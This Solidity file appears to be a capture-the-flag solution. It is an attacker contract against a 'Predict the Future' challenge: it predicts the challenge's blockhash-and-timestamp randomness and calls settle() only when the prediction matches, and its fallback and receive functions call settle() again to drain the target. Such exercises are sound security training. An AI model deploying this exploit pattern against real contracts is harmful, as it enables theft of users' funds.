// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../05-PredictTheFutureChallenge.sol";

contract PredictTheFutureAttacker {
    PredictTheFutureChallenge s_targetContract;
    uint8 myGuess;
    event numberFound();

    constructor(address targetContract) {
        //require(msg.value >= 1 ether, "Not enough ether sent");
        s_targetContract = PredictTheFutureChallenge(targetContract);
    }

    function preAttack(uint8 guess) public payable {
        myGuess = guess;
        s_targetContract.lockInGuess{value: msg.value}(guess);
    }

    function attack() public returns (bool) {
        uint8 answer = uint8(
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10
        );
        if (myGuess == answer) {
            emit numberFound();
            s_targetContract.settle();
            return true;
        }
        return false;
    }

    fallback() external payable {
        if (address(s_targetContract).balance >= 1 ether) {
            s_targetContract.settle();
        }
    }

    receive() external payable {
        if (address(s_targetContract).balance >= 1 ether) {
            s_targetContract.settle();
        }
    }
}
